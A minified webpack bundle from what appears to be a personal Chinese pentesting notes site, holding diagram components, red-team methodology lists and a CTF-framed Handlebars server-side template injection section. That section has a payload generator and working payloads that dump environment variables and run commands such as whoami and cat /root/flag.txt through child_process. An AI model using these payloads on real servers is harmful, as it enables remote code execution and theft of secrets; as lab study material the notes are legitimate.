(self.webpackChunkant_design_pro=self.webpackChunkant_design_pro||[]).push([[9123],{630461:function(O){O.exports={pyramidWra:"pyramidWra___27LyC",isOverFlow:"isOverFlow___2Gm9M",pyramidItem:"pyramidItem___33y6q",pyramidItem_levelTag:"pyramidItem_levelTag___3a_4s",pyramidItem_SubItem_Title:"pyramidItem_SubItem_Title___1kxQ_",pyramidLv:"pyramidLv___ReHfA",pyramid_lv_1_item:"pyramid_lv_1_item___2M4nG",pyramid_lv_2_item:"pyramid_lv_2_item___2qhNd",pyramid_lv_3_item:"pyramid_lv_3_item___3gwuq",pyramid_lv_4_item:"pyramid_lv_4_item___2vZY_"}},130695:function(O,w,n){"use strict";n.d(w,{E:function(){return o}});var a=n(311849),e=n(667294),B=n(630461),r=n.n(B),i=n(735510),d=n.n(i),b=n(481984),y=n(846190),A=n(194657),P=n(892669),C=n(632445),R=n(615985),D=n(297238),l=n(447787);function h(t){var u=D.Table_Helper.check_isString(t)||l.M4.isElement(t);return u}function c(t){var u=arguments.length>1&&arguments[1]!==void 0?arguments[1]:20,s=h(t);return(0,a.Z)({},s?{minWidth:"".concat(u,"em")}:{})}var W=t=>{var u=t.item,s=t.size,v=t.dispatch,_=t.my_custom_store.is_\u91D1\u5B57\u5854_tooltip_Inited,m=(0,e.useState)(!1),E=(0,A.Z)(m,2),F=E[0],U=E[1];function T(){U(!F)}function L(){return F?"unset":"0"}return e.createElement(e.Fragment,null,e.createElement("h1",{className:d()(r().pyramidItem_SubItem_Title),style:(0,a.Z)({cursor:"pointer"},s==="medium"?c("\u5047\u8BBE\u662F\u4E00\u4E2A\u5185\u5BB9",15):{}),onClick:()=>{T()}},u.name,e.createElement("span",{style:{}},e.createElement(y.Z,{placement:"right",title:"\u53EA\u6709\u81EA\u8EAB\u65E0child\u7684\u8282\u70B9\uFF0C\u624D\u4F1A\u6709\u6700\u5C0F\u5BBD\u5EA6",trigger:_?"contextMenu":"click",onVisibleChange:I=>{I===!0&&v({type:"my_custom_store/sync_set_is_\u91D1\u5B57\u5854_tooltip_Inited",payload:!0})}},F?e.createElement(P.wOv,null):e.createElement(P.uc4,null)))),F&&e.createElement("div",{style:{}},e.createElement(o,{cfg:u.sub,isChildPyramid:!0})))},M=C.PG.getInstance(W,R.Z);function f(t,u){var s=h(t)?t.length>0?e.createElement("h1",null,t):void 0:e.createElement(M,{item:t,size:u});return s}var o=t=>{var u,s,v,_,m=t.cfg,E=t.style,F=t.isChildPyramid,U=F===void 0?!1:F,T=t.isOverFlow,L=T===void 0?!1:T,I=t.size,S=I===void 0?"medium":I;function g(p){var x={1:"\u2460",2:"\u2461",3:"\u2462",4:"\u2463"}[p];return e.createElement("h3",{className:r().pyramidItem_levelTag},x)}return e.createElement(e.Fragment,null,e.createElement("div",{className:d()(r().pyramidWra,{[r().isChildPyramid]:U,[r().isOverFlow]:L}),style:E},e.createElement("div",{className:d()(r().pyramidLv,r().pyramid_lv_1)},(u=m.lv1)===null||u===void 0?void 0:u.map(p=>e.createElement("div",{className:d()(r().pyramidItem,r().pyramid_lv_1_item),style:(0,a.Z)((0,a.Z)({},c(p)),{},{position:"relative"})},f(p,S),g(1)))),e.createElement("div",{className:d()(r().pyramidLv,r().pyramid_lv_2)},(s=m.lv2)===null||s===void 0?void 0:s.map(p=>e.createElement("div",{className:d()(r().pyramidItem,r().pyramid_lv_2_item),style:(0,a.Z)((0,a.Z)({},c(p)),{},{position:"relative"})},f(p,S),g(2)))),e.createElement("div",{className:d()(r().pyramidLv,r().pyramid_lv_3)},(v=m.lv3)===null||v===void 0?void 0:v.map(p=>e.createElement("div",{className:d()(r().pyramidItem,r().pyramid_lv_3_item),style:(0,a.Z)((0,a.Z)({},c(p)),{},{position:"relative"})},f(p,S),g(3)))),e.createElement("div",{className:d()(r().pyramidLv,r().pyramid_lv_4)},(_=m.lv4)===null||_===void 0?void 0:_.map(p=>e.createElement("div",{className:d()(r().pyramidItem,r().pyramid_lv_4_item),style:(0,a.Z)((0,a.Z)({},c(p)),{},{position:"relative"})},f(p,S),g(4))))))}},947323:function(O,w,n){"use strict";n.d(w,{EN:function(){return C},sw:function(){return l},sy:function(){return h},cU:function(){return W},BJ:function(){return M},RY:function(){return f}});var a=n(705795),e=n(667294),B=n(130695),r=n(297238),i=n(888767),d=n(635801),b=[0,0+1,0+1+3,0+1+3+9,0+1+3+9+27];function y(o,t){var u=t-1,s=t+1-1;return o.slice(b[u],b[s])}function A(o){return o.map(t=>{if(r.Table_Helper.check_isString(t))return t;var u=t,s=P(u);return s})}function P(o){var t=o,u=t[0]||"--",s=t.slice(1),v=y(s,1),_=y(s,2),m=y(s,3),E=y(s,4);return{name:u,sub:{lv1:A(v),lv2:A(_),lv3:A(m),lv4:A(E)}}}var C=o=>{var t=o.strings,u=o.size,s=u===void 0?"medium":u,v=o.isMobile,_=v===void 0?!1:v,m=["--",...t],E=P(m).sub,F=E.lv1,U=E.lv2,T=E.lv3,L=E.lv4;if(_){let S=function(g){if(r.Table_Helper.check_isString(g)){var p=g;return e.createElement(e.Fragment,null,e.createElement("li",null,p))}else{var x=g,k=(0,a.Z)(x),z=k[0],H=k.slice(1);return e.createElement(e.Fragment,null,e.createElement("li",null,z),e.createElement("ol",null,H.map(j=>e.createElement(e.Fragment,null,e.createElement("li",null,S(j))))))}};var I="ol";switch(I){case"ol":return e.createElement("ol",null,t.map(g=>S(g)));case"\u666E\u901A\u6587\u672C":return e.createElement("ol",null,t.flat(21).map(g=>e.createElement("li",null,g)))}}else return e.createElement(e.Fragment,null,e.createElement(B.E,{cfg:{lv1:F,lv2:U,lv3:T,lv4:L!=null?L:[]},size:s}))},R=null,D=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE","\u4E2D\u95F4\u4EF6\uFF0C\u5982\u679C\u6709\u767B\u5F55\u53E3\uFF0C\u53EF\u4EE5\u67E5\u627E\u9ED8\u8BA4\u5BC6\u7801","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["\u5F31\u53E3\u4EE4\uFF0C\u4ECE\u6CA1\u6709\u4E00\u4E2A\u65F6\u4EE3\uFF0C\u50CF\u73B0\u5728","1"],["\u4EE5\u3010\u53EF\u53E0\u52A0\u3011\u65B9\u5F0F\u6536\u96C6\u6700\u65B0\u7684\u6F0F\u6D1E\u4FE1\u606F","HackerOne",d.Wx._1_links__\u5916\u90E8\u7F51\u9875._\u5B89\u5168\u8D44\u8BAF._Hacking8]],l=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u901A\u7528\u8868\u2014\u2014\u770B\u4E0D\u5230\u4FE1\u606F\u2014\u2014\u9700\u8981\u76F2\u8BD5"),e.createElement("h2",null,"\uFF08\u91CD\u8981\u6027\u6392\u5E8F\uFF09"),e.createElement(C,{strings:D,size:"mini"})),h=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u9776\u673A\u600E\u4E48\u6253"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(C,{strings:["\u5916\u90E8\u4FE1\u606F\u6536\u96C6\uFF08\u975E\u5FC5\u8981\uFF09",["Enumeration/\u679A\u4E3E","\u8D44\u4EA7\u626B\u63CF"],"Identification / \uFF1F\uFF1F\uFF1F","Exploit / Exp\u5229\u7528","Foothold/\u5229\u7528\u70B9\u67E5\u627E","Post-Exploitation / \u540E\u6E17\u900F","Lateral Movement / \u6A2A\u5411\u6E17\u900F","Privilege Escalation / \u63D0\u6743"],size:"mini"}));function c(o){var t=o.routes,u=o.name,s=u===void 0?"--":u;return t?[s,...t.map(v=>c(v))]:s}var W=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u6B63\u5E38\u5168\u6D41\u7A0B-\u6E17\u900F\u6D4B\u8BD5\u6D41\u7A0B"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),(()=>{var o=[...i.LI.get_\u6E17\u900F\u6D41\u7A0B_routes().map(t=>c(t))];return e.createElement(C,{strings:o,size:"mini"})})()),M=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u56FD\u8D44\u4E91\u6388\u6743\u6D4B\u8BD5"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(C,{strings:[["\u5916\u7F51\u6D4B\u8BD5","\u4FE1\u606F\u6536\u96C6\uFF08\u7565\uFF09",["\u8D44\u4EA7\u626B\u63CF","Goby","nmap"],["\u6F0F\u6D1E\u624B\u6D4B",["\u8D26\u53F7\u76F8\u5173","\u5F31\u53E3\u4EE4"],"SQL\u6CE8\u5165"]],["\u5185\u7F51\u6D4B\u8BD5",["\u8D44\u4EA7\u626B\u63CF","FScan\uFF08\u6548\u679C\u5947\u597D\uFF01\u64CD\u4F5C\u50BB\u74DC\uFF09","\u548C\u5916\u7F51\u76F8\u540C\uFF1AGoby\u3001nmap"]]],size:"mini"})),f=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u62A4\u7F51\u7EA2\u961F"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(C,{strings:[["\u57FA\u672C\u6D41\u7A0B","\u5165\u53E3\u6743\u9650\uFF08\u79F0\u4E3A\u6253\u70B9\uFF09","\u5185\u7F51\u641C\u96C6/\u63A2\u6D4B","\u514D\u6740\u63D0\u6743","\u6293\u53D6\u767B\u5F55\u51ED\u8BC1","\u8DE8\u5E73\u53F0\u7684\u6A2A\u5411\u653B\u51FB","\u5165\u53E3\u6743\u9650\u7EF4\u6301","\u96A7\u9053\u6570\u636E\u56DE\u4F20","\u5B9A\u671F\u6743\u9650\u7EF4\u6301"],"\u4FE1\u606F\u6CC4\u9732\u6536\u96C6","\u8D44\u4EA7\u6536\u96C6"],size:"mini"}))},242776:function(O,w,n){"use strict";n.d(w,{cK:function(){return R},du:function(){return D}});var a=n(868137),e=n(450532),B=n(311849),r=n(194657),i=n(667294),d=n(406066),b=n(297238),y={};function A(l){return y[l]||(y[l]=new d.f("Hack_Cp____"+l)),y[l]}function P(l,h){var c=encodeURIComponent(l);return h?(0,b.get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre)(h,c):i.createElement("pre",null,c)}function C(l,h){var c=encodeURI(l);return h?get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre(h,c):React.createElement("pre",null,c)}var R=l=>{var h=l.special_name,c=l.var_names_arr,W=l.code_template_arr,M=l.gen_str_transfer_fn,f=A(h),o=(0,i.useState)(f.loadData____\u5141\u8BB8\u90E8\u5206\u6570\u636E\u6B8B\u7F3A()),t=(0,r.Z)(o,2),u=t[0],s=t[1],v=(()=>W.map(_=>{var m=_;return c.forEach(E=>{var F;m=m.replaceAll("###<".concat(E,">###"),((F=u[E])===null||F===void 0?void 0:F.trim())||"\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014")}),m}))();return i.createElement("div",{style:(0,B.Z)({},b.\u5E38\u89C1_border\u8FB9\u6846)},c.map(_=>i.createElement("div",null,"\u3010",_,"\u3011\uFF1A",i.createElement(e.Z,{value:u[_],onChange:m=>{f.simple_set_and_save(_,m,u,s)}}))),v.map(_=>i.createElement(i.Fragment,null,(0,b.get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre)("\u6A21\u677F\u751F\u6210\u3010".concat(h,"\u3011"),_),M==null?void 0:M(_,h))))};class D{}D.SSTI={HandleBars:{\u4ECB\u7ECD:"Server-Side Template Injection",\u76F8\u5173\u6280\u5DE7:i.createElement(i.Fragment,null,i.createElement(R,{special_name:"HandleBars",var_names_arr:["code"],code_template_arr:[`
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return  ###<code>###  ;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}
        `],gen_str_transfer_fn:l=>P(l,"URL\u7F16\u7801")}),`

    \u76F8\u5173\u6280\u5DE7\u8BF4\u660E\uFF1A
        https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
        \u539F\u59CB\u6750\u6599\u6765\u6E90\uFF1Ahttps://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/#RCE-%F0%9F%92%A3

    \u8FDB\u4E00\u6B65\uFF1A
        \u6709\u65F6\u5019\uFF0C\u4F1A\u9047\u5230\u3010require\u3011\u65E0\u6CD5\u8BBF\u95EE\u7684\u95EE\u9898\u3002\u6B64\u65F6\uFF0C\u53EF\u80FD\u662F\u9047\u5230\u4E86\u3010\u6C99\u76D2\u6A21\u5F0F\u3011

        \u7136\u540E\uFF0C\u3010require("process").exec\u3011\u6709\u65F6\u5019\uFF0C\u65E0\u6CD5\u7ACB\u5373\u5F97\u5230\u7ED3\u679C\uFF1A
            1. exec\uFF0C      \u662F\u3010\u5F02\u6B65\u65B9\u6CD5\u3011
            2. execSync\uFF0C  \u662F\u3010\u540C\u6B65\u65B9\u6CD5\u3011

    Exp
        \uFF08\u9776\u573A\uFF0C\u5F53\u65F6\u662F\u53EF\u4EE5\u76F4\u63A5\u6267\u884C\u7684\uFF0C\u5148\u7528UrlEncode\u4E00\u4E0B\u3002\uFF09


        \u4E00\u4E9B\u3010CTF\u60AC\u8D4F\u3011\u7684\u7B54\u6848\uFF1A

                <!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) -->

                {{#with "s" as |string|}}
                  {{#with "e"}}
                    {{#with split as |conslist|}}
                      {{this.pop}}
                      {{this.push (lookup string.sub "constructor")}}
                      {{this.pop}}
                      {{#with string.split as |codelist|}}
                        {{this.pop}}
                        {{this.push "return JSON.stringify(process.env);"}}
                        {{this.pop}}
                        {{#each conslist}}
                          {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                          {{/with}}
                        {{/each}}
                      {{/with}}
                    {{/with}}
                  {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                     {{#with split as |conslist|}}
                         {{this.pop}}
                         {{this.push (lookup string.sub "constructor")}}
                         {{this.pop}}
                         {{#with string.split as |codelist|}}
                         {{this.pop}}
                         {{this.push "return process;"}}
                         {{this.pop}}
                         {{#each conslist}}
                           {{#with (string.sub.apply 0 codelist)}}
                             {{this}}
                           {{/with}}
                         {{/each}}
                       {{/with}}
                     {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process')\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule.require('child_process');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      After URL encoding and sending the payload, we get the following response from the server:
                                      The require object has been called successfully and the child_process module loaded. Let's now
                                      attempt to run system commands.
                                      We will need to URL encode the above payload once again.
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process').execSync('whoami')\u3011\u662F\u5426\u6709\u6548\uFF1A
                \uFF08\u5DF2\u7ECF\uFF0C\u83B7\u5F97\u4E86\u3010whoami\u3011  \u6267\u884C\u7684\u7ED3\u679C\uFF01\uFF01\uFF09

                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return    process.mainModule.require('child_process').execSync('whoami');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}


                \u5728\u3010\u8FD9\u4E2APoC\u3011\u6D4B\u8BD5\u6210\u529F\u540E\uFF0C\u540E\u9762\u7684\u6D4B\u8BD5\uFF0C\u5C31\u90FD\u662F\u3010\u9010\u6B65\u8FD0\u884C\u547D\u4EE4\u3011\u4E86\uFF01\uFF01
                    \u3010 process.mainModule.require('child_process').execSync('ls /root');  \u3011
                    \u3010 process.mainModule.require('child_process').execSync('cat /root/flag.txt');  \u3011

                \u5982\u6B64\u9012\u5F52\uFF0C\u5F88\u5FEB\u5C31\u53EF\u4EE5\u62FF\u5230\u3010Flag.txt\u3011\u3002


    `)}},D.Jenkins=i.createElement(i.Fragment,null,`
              \u8A79\u91D1\u65AF-HackTricks
                  https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
  `),D.mssql_sqlserver=i.createElement(i.Fragment,null,`
      MSSQL - Microsoft SQL Server
          https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
  `),D.CodeReview_\u4EE3\u7801\u5BA1\u8BA1={\u8BB0\u5F55\u7684_\u5BA1\u8BA1\u5DE5\u5177:i.createElement(i.Fragment,null,`
      \u5BA1\u8BA1\u5DE5\u5177\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web/code-review-tools
    `),\u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D_\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4:i.createElement(i.Fragment,null,`
      \u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D\uFF0C\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web#source-code-review
    `),\u4E91\u5B89\u5168_CloudSecurity:i.createElement(i.Fragment,null,`
      \u3010\u4E91\u5B89\u5168\u3011\u4EE3\u7801\u5BA1\u8BA1\uFF1A

          https://book.hacktricks.xyz/cloud-security/cloud-security-review
    `)}},179445:function(O,w,n){"use strict";n.r(w);var a=n(667294),e=n(240675),B=n(654433);w.default=()=>a.createElement(a.Fragment,null,a.createElement(B.Tg,{h_em:21.5}),a.createElement("div",{style:{marginTop:"1em"}},a.createElement(e.ZP,{flag_personalText:!1})))}}]);
